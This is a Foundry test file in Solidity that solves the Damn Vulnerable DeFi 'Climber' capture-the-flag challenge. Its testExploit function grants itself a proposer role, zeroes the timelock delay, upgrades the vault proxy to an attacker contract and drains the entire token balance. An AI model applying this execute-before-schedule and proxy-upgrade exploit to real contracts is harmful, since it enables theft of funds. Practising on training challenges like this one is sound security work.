// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

import {NewClimberVault} from "../../../src/Contracts/attacker-contracts/Climber/ClimberAttackProxy.sol";
import {TimelockAttack} from "../../../src/Contracts/attacker-contracts/Climber/TimelockAttack.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    NewClimberVault internal newClimberVault;
    TimelockAttack internal timelockAttack;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);

        timelockAttack = new TimelockAttack(
            address(climberImplementation),
            payable(climberTimelock),
            address(dvt),
            attacker
        );

        newClimberVault = new NewClimberVault();

        bytes32 proposerRole = keccak256("PROPOSER_ROLE");

        string memory grantRoleString = "grantRole(bytes32,address)";
        bytes memory grantRoleData = abi.encodeWithSignature(
            grantRoleString,
            proposerRole,
            address(timelockAttack)
        );

        string memory updateDelayString = "updateDelay(uint64)";
        bytes memory updateDelayData = abi.encodeWithSignature(
            updateDelayString,
            0
        );

        string memory upgradeString = "upgradeTo(address)";
        bytes memory upgradeToData = abi.encodeWithSignature(
            upgradeString,
            address(newClimberVault)
        );

        string memory attackString = "attack()";
        bytes memory attackData = abi.encodeWithSignature(attackString, "");

        address[] memory targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(newClimberVault);
        targets[3] = address(timelockAttack);

        bytes[] memory data = new bytes[](4);
        data[0] = grantRoleData;
        data[1] = updateDelayData;
        data[2] = upgradeToData;
        data[3] = attackData;

        uint256[] memory zero = new uint256[](4);
        zero[0] = 0;
        zero[1] = 0;
        zero[2] = 0;
        zero[3] = 0;

        timelockAttack.setScheduleData(targets, data);

        bytes32 salt = keccak256(abi.encodePacked(uint256(0)));
        climberTimelock.execute(targets, zero, data, salt);

        timelockAttack.withdrawFunds();

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
